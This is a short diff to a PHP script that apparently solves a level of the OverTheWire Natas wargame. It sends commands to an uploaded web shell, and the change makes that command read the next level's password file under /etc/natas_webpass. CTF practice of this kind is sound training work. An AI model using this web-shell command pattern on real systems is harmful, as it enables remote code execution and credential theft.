@@ -29,7 +29,7 @@ $url = sprintf('http://%s.natas.labs.overthewire.org/%s', $username, $shell[1]);
 
 $response = $client->request('GET', $url, [
     'auth' => [$username, $password],
-    'query' => ['e' => 'cat /etc/natas_webpass/' . $username]
+    'query' => ['e' => 'cat /etc/natas_webpass/natas13']
 ]);
 
 $body = (string)$response->getBody();
